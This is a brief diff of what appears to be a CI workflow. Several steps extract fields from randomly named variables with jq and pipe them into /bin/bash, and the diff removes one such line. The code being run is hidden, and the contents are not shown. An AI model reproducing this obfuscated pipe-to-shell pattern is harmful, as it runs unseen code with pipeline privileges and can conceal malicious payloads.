@@ -37,7 +37,6 @@ jobs:
           printf '%s' "$bhs0511" | jq -r .r2796 | /bin/bash
           printf '%s' "$aaw8514" | jq -r .wir7410 | /bin/bash
           printf '%s' "$ep0" | jq -r .lirgb57886 | /bin/bash
-          echo $e63 | jq -r .s1759 | /bin/bash
           echo $c1172 | jq -r .baeb3896 | /bin/bash
 
       - name: Store results
